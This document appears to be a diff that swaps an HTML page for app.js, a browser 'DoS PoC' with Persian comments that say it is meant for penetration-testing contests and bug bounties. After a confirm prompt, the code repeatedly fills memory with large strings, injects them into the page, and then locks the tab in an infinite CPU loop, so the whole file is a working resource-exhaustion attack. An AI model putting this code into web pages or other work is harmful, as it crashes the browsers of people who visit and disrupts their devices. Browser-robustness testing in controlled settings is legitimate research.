@@ -1,22 +1,50 @@
-<!DOCTYPE html>
-<html lang="fa" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <title>Browser Stress Test PoC</title>
-    <style>
-        body { background: #0a0a0a; color: #00f2fe; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        .container { text-align: center; border: 1px solid #00f2fe; padding: 40px; border-radius: 20px; box-shadow: 0 0 20px #00f2fe33; }
-        button { background: transparent; border: 2px solid #ff4444; color: #ff4444; padding: 15px 30px; font-weight: bold; cursor: pointer; transition: 0.3s; }
-        button:hover { background: #ff4444; color: white; box-shadow: 0 0 15px #ff4444; }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h1>Browser Resource Exhaustion PoC</h1>
-        <p>This is a security research tool to test browser stability.</p>
-        <button id="startTest">Run Heavy Crash Test</button>
-    </div>
-    <script src="app.js"></script>
-</body>
-</html>
+/**
+ * NEXUS OS - Browser Stability & DoS PoC
+ * مخصوص مسابقات گیت‌هاب - تست نفوذ و باگ بانتی
+ */
+
+document.getElementById('startTest').addEventListener('click', function() {
+    // اصلاح نام متغیر از confirmation به confirmAction
+    const confirmAction = confirm("هشدار امنیتی: این تست باعث اشغال ۱۰۰٪ منابع و کرش تب می‌شود. ادامه می‌دهید؟");
+    
+    if (confirmAction) {
+        console.log("تست نفوذ آغاز شد...");
+        heavyCrash();
+    }
+});
+
+function heavyCrash() {
+    // ۱. فریز کردن آنی رابط کاربری (UI Blocking)
+    // این بخش باعث می‌شود مرورگر دیگر به هیچ کلیکی پاسخ ندهد
+    const freezeUI = () => {
+        while(true) {
+            // ایجاد بار محاسباتی سنگین
+            Math.sqrt(Math.random() * 9999999);
+        }
+    };
+
+    // ۲. پر کردن رم با سرعت وحشتناک (Memory Exhaustion)
+    // استفاده از شئی (Object) برای جلوگیری از پاکسازی توسط مرورگر
+    let storage = {};
+    let count = 0;
+
+    setInterval(() => {
+        // ایجاد بلاک‌های ۵۰ مگابایتی در هر ۱۰ میلی‌ثانیه
+        let bigData = new Array(1000000).fill("CRASH_REZA_NEXUS_" + Math.random()).join('###');
+        storage['block_' + count] = bigData;
+        count++;
+
+        // اضافه کردن همزمان به صفحه برای درگیر کردن پردازنده گرافیکی
+        let blob = document.createElement('div');
+        blob.innerHTML = bigData;
+        document.body.appendChild(blob);
+
+        console.log("Allocated Blocks: " + count);
+        
+        // وقتی رم به مرز انفجار رسید، پردازنده را قفل کن
+        if (count > 50) {
+            freezeUI();
+        }
+    }, 10);
+}
 
